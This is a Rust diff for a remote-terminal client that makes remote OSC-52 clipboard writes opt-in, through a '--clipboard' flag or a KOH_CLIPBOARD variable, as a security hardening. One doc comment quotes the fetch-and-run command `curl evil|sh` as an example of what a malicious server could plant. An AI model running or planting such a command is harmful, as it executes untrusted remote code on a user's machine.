@@ -64,6 +64,23 @@ pub struct ConnectArgs {
     /// a command-line argument is visible in the process table, an env var is not.
     #[arg(long)]
     passphrase: Option<String>,
+
+    /// Honor remote OSC-52 clipboard writes (let the remote app set your system clipboard).
+    /// OFF by default: a malicious/compromised server could otherwise silently overwrite your
+    /// clipboard (e.g. swap a copied command for `curl evil|sh`). Also enable with `KOH_CLIPBOARD=1`.
+    #[arg(long)]
+    clipboard: bool,
+}
+
+/// Whether remote OSC-52 clipboard writes should be honored: the `--clipboard` flag, or a truthy
+/// `$KOH_CLIPBOARD` (`1`/`true`/`yes`/`on`, case-insensitive). Default off (L-1).
+fn clipboard_opt_in(flag: bool) -> bool {
+    flag || std::env::var("KOH_CLIPBOARD").is_ok_and(|v| {
+        matches!(
+            v.trim().to_ascii_lowercase().as_str(),
+            "1" | "true" | "yes" | "on"
+        )
+    })
 }
 
 /// Arguments for `koh id`.
@@ -208,7 +225,9 @@ pub async fn connect(args: ConnectArgs) -> anyhow::Result<Option<u32>> {
     spawn_signal_shutdown(shutdown.clone())?;
 
     // --- real terminal I/O wiring (termina: raw mode + alt screen, restored on drop) ---
-    let term = TerminaTerminal::enter().context("entering raw mode / alt screen")?;
+    let clipboard_enabled = clipboard_opt_in(args.clipboard);
+    let term =
+        TerminaTerminal::enter(clipboard_enabled).context("entering raw mode / alt screen")?;
     let (rows, cols) = term.size().unwrap_or((24, 80));
 
     // Raw stdin reader (byte-perfect passthrough) on a dedicated blocking thread.
